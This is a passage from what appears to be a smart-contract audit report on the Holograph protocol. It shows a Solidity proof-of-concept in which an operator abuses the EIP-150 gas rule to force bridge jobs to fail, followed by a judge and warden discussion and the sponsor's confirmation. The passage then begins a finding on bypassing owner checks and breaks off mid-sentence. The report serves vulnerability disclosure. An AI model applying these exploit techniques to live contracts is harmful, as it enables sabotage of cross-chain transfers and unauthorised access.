class=\"mtk12\">hash</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FailedOperatorJob</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ++</span><span class=\"mtk12\">_inboundMessageCounter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">console2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Gas left at end: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">intermediate</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bridge</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bridgeCall</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Bridge</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Done</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gasLeft</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">myArr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bridgeCall</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> =</span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">100</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">myArr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// this line would never be reached, we&#39;ll be out of gas beforehand</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Done</span><span class=\"mtk1\">(</span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Output of PoC:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  Gas left before call:  999772</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Gas left after failure:  30672</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Gas left at end:  1628</span></span></code></pre>\n<p>Side note: due to some bug in forge <code>_inboundMessageCounter</code> would be considered warm even though it’s not necessarily the case. However in a real world scenario we can warm it up if the selected operator is a contract and we’er using another operator contract to execute a job in the same tx beforehand.</p>\n<p>Reference for the <code>1/64</code> rule - <a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md\">EIP-150</a>. Also check out <a href=\"https://www.evm.codes/#f1?fork=grayGlacier:~:text=From%20the%20Tangerine%20Whistle%20fork%2C%20gas%20is%20capped%20at%20all%20but%20one%2064th%20(remaining_gas%20/%2064)%20of%20the%20remaining%20gas%20of%20the%20current%20context.%20If%20a%20call%20tries%20to%20send%20more%2C%20the%20gas%20is%20changed%20to%20match%20the%20maximum%20allowed.\">evm.codes</a>.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Modify the required amount of gas left to gasLimit + any amount of gas spent before reaching the <code>call()</code>, then multiply it by <code>32/30</code> to mitigate the <code>1/64</code> rule (+ some margin of safety maybe).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294662144\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>There are some risks but would require the nested call gas limit to be pretty high (e.g. 1m used in the poc) to have enough gas (<code>1/64</code>) left afterward so that it doesn’t revert due to out-of-gas.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294682078\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@gzeon - actually this is not a limitation. When the call argument passes a gaslimit which is lower than the available gas, it instantly reverts with no gas wasted. Therefore we will have <code>64/64</code> of the gas amount to work with post-revert.<br>\nI have explained this in duplicate report <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/437\"><code>#437</code></a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294770261\">0xA5DF (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>When the call argument passes a gaslimit which is lower than the available gas, it instantly reverts with no gas wasted.</p>\n</blockquote>\n<p>You mean <em>higher</em> than the available gas?<br>\nI thought the same, but doing some testing and reading the Yellow Paper it turns out it wouldn’t revert just because the gas parameter is higher than the available gas.<br>\nYou can modify the PoC above to test that too.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294786488\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>You can check this example in Remix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">contract Storage {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     * @dev Return value </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     * @return value of &#39;number&#39;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function gas_poc() public  returns (uint256, uint256){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 left_gas = gasleft();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address this_address = address(this);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            let result := call(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            left_gas,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            /// @dev destination is bridge contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            this_address,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            /// @dev any value is passed along</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            0,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            /// @dev data is retrieved from 0 index memory position</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            0,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            /// @dev everything except for last 32 bytes (gas limit) is sent</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            0,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            0,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 after_left_gas = gasleft();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return (left_gas, after_left_gas);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    fallback() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>We pass a lower gas limit than what we have in the “call” opcode, which reverts.<br>\nThe function returns </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t&quot;0&quot;: &quot;uint256: 3787&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t&quot;1&quot;: &quot;uint256: 3579&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Meaning only the gas consumed by the call opcode was deducted, not 63/64.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294800675\">0xA5DF (warden) commented</a>:</strong></p>\n<blockquote>\n<p>In your example the fallback function is actually being called, it’s just doesn’t use much gas, I’ve added an event to confirm that:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Storage</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Cool</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Return value </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> value of &#39;number&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">gas_poc</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\">  </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">left_gas</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">this_address</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\"> := </span><span class=\"mtk10\">call</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// @dev gas limit is retrieved from last 32 bytes of payload in-memory value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">left_gas</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">/// @dev destination is bridge contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">this_address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">/// @dev any value is passed along</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">/// @dev data is retrieved from 0 index memory position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">/// @dev everything except for last 32 bytes (gas limit) is sent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">after_left_gas</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">left_gas</span><span class=\"mtk1\">, </span><span class=\"mtk12\">after_left_gas</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">fallback</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Cool</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Output:<br>\n<img src=\"https://user-images.githubusercontent.com/108216601/198561406-53968c73-3196-4f94-ad65-9ce4f2877d28.png\" alt=\"image\"></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294817386\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>A child call can never use more than 63/64 of gasleft post eip-150.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294843497\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xA5DF - Yeah , it seems my setup when I tested this during the contest was wrong, because it instantly reverted in the CALL opcode.<br>\nPage 37 of the Yellow book describes the GASCAP as minimum of gasLeft input and current gas counter minus costs:<br>\n<img src=\"https://user-images.githubusercontent.com/9900020/198568925-2f91aaed-61e2-454d-b8cf-42e9f1ce1477.png\" alt=\"image\"><br>\nThanks for the good direct counterexample.<br></p>\n<p>@gzeon - Right, we were discussing if call to child will instantly revert because <code>requestedGas > availableGas</code>, but it doesn’t.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294849312\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>That’s true, and the code also doesn’t forward a limited amount of gas explicitly too.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1294854809\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>The point was that executor can always craft supplied gas to the contract, so that during the CALL opcode, gas left would be smaller than requested gas limit. If EVM behavior reverts in this check, we have deterministic failing of <code>bridgeIn</code>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#issuecomment-1307829065\">alexanderattar (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Nice find! Gas limit sent by operator could be used maliciously to ensure that job fails. This will be updated to mitigate the issue observed.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/176#event-7817152060\">ACC01ADE (Holograph) resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/84\">Feature/HOLO-604: implementing critical issue fixes</a></p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-19\" style=\"position:relative;\"><a href=\"#medium-risk-findings-19\" aria-label=\"medium risk findings 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (19)</h1>\n<h2 id=\"m-01-isowner--onlyowner-checks-can-be-bypassed-by-attacker-in-erc721erc20-implementations\" style=\"position:relative;\"><a href=\"#m-01-isowner--onlyowner-checks-can-be-bypassed-by-attacker-in-erc721erc20-implementations\" aria-label=\"m 01 isowner  onlyowner checks can be bypassed by attacker in erc721erc20 implementations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/464\">[M-01] <code>isOwner</code> / <code>onlyOwner</code> checks can be bypassed by attacker in ERC721/ERC20 implementations</a></h2>\n<p><em>Submitted by Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L185\">ERC721H.sol#L185</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/ERC721H.sol#L121\">ERC721H.sol#L121</a><br></p>\n<p>ERC20H and ERC721H are base contracts for NFTs / coins to inherit from. They supply the modifier onlyOwner and function isOwner which are used in the implementations for access control. However, there are several functions which when using these the answer may be corrupted to true by an attacker.</p>\n<p>The issue comes from confusion between calls coming from HolographERC721’s fallback function, and calls from actually implemented functions.</p>\n<p>In the fallback function, the enforcer appends an additional 32 bytes of <code>msg.sender</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  calldatacopy(0, 0, calldatasize())</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  mstore(calldatasize(), caller())</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let result := call(gas(), sload(_sourceContractSlot), callvalue(), 0, add(calldatasize(), 32), 0, 0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  returndatacopy(0, 0, returndatasize())</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  switch result</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  case 0 {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    revert(0, returndatasize())</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  default {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return(0, returndatasize())</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Indeed these are the bytes read as msgSender:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function msgSender() internal pure returns (address sender) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    sender := calldataload(sub(calldatasize(), 0x20))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>and isOwner simply compares these to the stored owner:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function isOwner() external view returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  if (msg.sender == holographer()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return msgSender() == _getOwner();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return msg.sender == _getOwner();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>However, the enforcer calls these functions directly in several locations, and in these cases it of course does not append a 32 byte msg.sender. For example, in safeTransferFrom:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function safeTransferFrom(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bytes memory data</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) public payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  require(_isApproved(msg.sender, tokenId), &quot;ERC721: not approved sender&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  if (_isEventRegistered(HolographERC721Event.beforeSafeTransfer)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(SourceERC721().beforeSafeTransfer(from, to, tokenId, data));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _transferFrom(from, to, tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  if (_isContract(to)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721TokenReceiver.onERC721Received.selector),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      &quot;ERC721: onERC721Received fail&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  if (_isEventRegistered(HolographERC721Event.afterSafeTransfer)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(SourceERC721().afterSafeTransfer(from, to, tokenId, data));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Here, caller has arbitrary control of the data parameter, and can 